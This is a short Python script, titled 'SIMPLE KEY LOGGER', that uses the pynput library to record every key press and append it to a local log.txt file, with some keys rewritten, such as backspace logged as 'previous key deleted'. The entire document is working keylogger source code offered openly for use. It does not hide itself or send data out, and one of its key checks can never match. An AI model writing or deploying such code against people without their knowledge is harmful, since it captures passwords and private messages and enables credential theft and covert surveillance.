from pynput.keyboard import Listener

print("**** SIMPLE KEY LOGGER ****\n\n")
def writetofile(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ' '
    if letter == 'Key.ctrl':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'Key.backspace':
        letter = '\n previous key deleted >>'
    if letter == 'Key.alt_lKey.f4':
        letter = '\n user has closed the tab'

    with open("log.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=writetofile) as l:
    l.join()
